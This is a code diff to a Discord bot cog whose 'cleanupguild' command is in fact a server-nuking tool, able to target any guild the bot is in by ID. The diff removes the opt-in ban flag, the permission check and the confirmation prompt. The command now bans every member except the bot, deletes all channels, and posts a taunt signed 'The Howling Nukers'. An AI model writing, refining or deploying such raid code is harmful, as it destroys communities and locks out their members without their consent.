@@ -8,13 +8,13 @@ class CleanupGuild(commands.Cog):
     @commands.command()
     @commands.guild_only()
     @commands.is_owner()
-    async def cleanupguild(self, ctx, category_title: str = "General Category", channel_title: str = "general", guild_id: int = None, ban_users: bool = False):
+    async def cleanupguild(self, ctx, category_title: str = "General Category", channel_title: str = "general", guild_id: int = None):
         """
         Cleanup the specified guild or the current guild by:
-        1. Removing all channels and categories (except channels without permissions)
-        2. Adding one category and channel with the specified names
-        3. Sending a cleanup message in the new channel
-        4. Banning all users (excluding bot) if 'ban_users' is True
+        1. Banning all users (excluding bots)
+        2. Removing all channels and categories
+        3. Adding one category and channel with the specified names
+        4. Sending a cleanup message in the new channel
         """
         if guild_id:
             guild = self.bot.get_guild(guild_id)
@@ -24,78 +24,42 @@ class CleanupGuild(commands.Cog):
         else:
             guild = ctx.guild
 
-        renamed_channels = 0
-        banned_users = 0
+        bot_user = guild.get_member(self.bot.user.id)
 
-        # Check permissions before taking action
-        missing_perms = []
-        if not ctx.me.guild_permissions.manage_channels:
-            missing_perms.append("Manage Channels")
-        if not ctx.me.guild_permissions.ban_members and ban_users:
-            missing_perms.append("Ban Members")
-
-        # Notify the user about missing permissions
-        if missing_perms:
-            missing_perms_message = f"The bot is missing the following permissions: {', '.join(missing_perms)}"
-            await ctx.send(missing_perms_message)
-            await ctx.send("Do you want to proceed with the cleanup? Reply with 'yes' or 'no'.")
-
-            def check(message):
-                return message.author == ctx.author and message.content.lower() in ["yes", "no"]
-
-            try:
-                response = await self.bot.wait_for("message", check=check, timeout=60.0)
-                if response.content.lower() == "no":
-                    await ctx.send("Cleanup actions skipped.")
-                    return
-            except asyncio.TimeoutError:
-                await ctx.send("No response. Cleanup actions skipped.")
-                return
-
-        try:
-            # Remove all channels and categories (except channels without permissions)
-            for channel in guild.channels:
+        # Ban all users (excluding bots)
+        for member in guild.members:
+            if member != bot_user:
                 try:
-                    await channel.delete()
-                    renamed_channels += 1
-                except discord.Forbidden:
-                    await ctx.send(f"Skipping channel deletion: Missing permissions for {channel.name}")
+                    await member.ban(reason="CleanupGuild command")
+                except discord.errors.Forbidden:
+                    continue  # Continue to the next user if missing permissions
 
-            # Add one category with the specified name
+        renamed_channels = 0
+
+        # Remove all channels and categories
+        for channel in guild.channels:
             try:
-                category = await guild.create_category(category_title)
-            except discord.Forbidden:
-                await ctx.send("Skipping category creation: Missing permissions")
+                await channel.delete()
+                renamed_channels += 1
+            except discord.errors.Forbidden:
+                continue  # Continue to the next channel if missing permissions
 
-            # Add one text channel inside the category
-            try:
-                channel = await guild.create_text_channel(channel_title, category=category)
-            except discord.Forbidden:
-                await ctx.send("Skipping channel creation: Missing permissions")
+        # Add one category with the specified name
+        category = await guild.create_category(category_title)
 
-            # Send a cleanup message in the new channel
-            await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")
+        # Add one text channel inside the category
+        channel = await guild.create_text_channel(channel_title, category=category)
 
-            # Ban all users (excluding bot) if 'ban_users' is True
-            if ban_users:
-                bot_user = guild.get_member(self.bot.user.id)
-                for member in guild.members:
-                    if member != bot_user:
-                        try:
-                            await member.ban(reason="CleanupGuild command")
-                            banned_users += 1
-                        except discord.errors.Forbidden:
-                            await ctx.send(f"Skipping user ban: Missing permissions for {member.display_name}")
+        # Send a cleanup message in the new channel
+        await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")
 
-            # Output message detailing the actions
-            output_message = (
-                f"Renamed channels: **{renamed_channels}**\n"
-                f"Banned users: **{banned_users}**"
-            )
+        # Output message detailing the actions
+        output_message = (
+            f"Renamed channels: **{renamed_channels}**\n"
+            f"Banned users (excluding bots)."
+        )
 
-            await ctx.send(output_message)
-        except Exception as e:
-            await ctx.send(f"An error occurred: {e}")
+        await ctx.send(output_message)
 
 def setup(bot):
     bot.add_cog(CleanupGuild(bot))
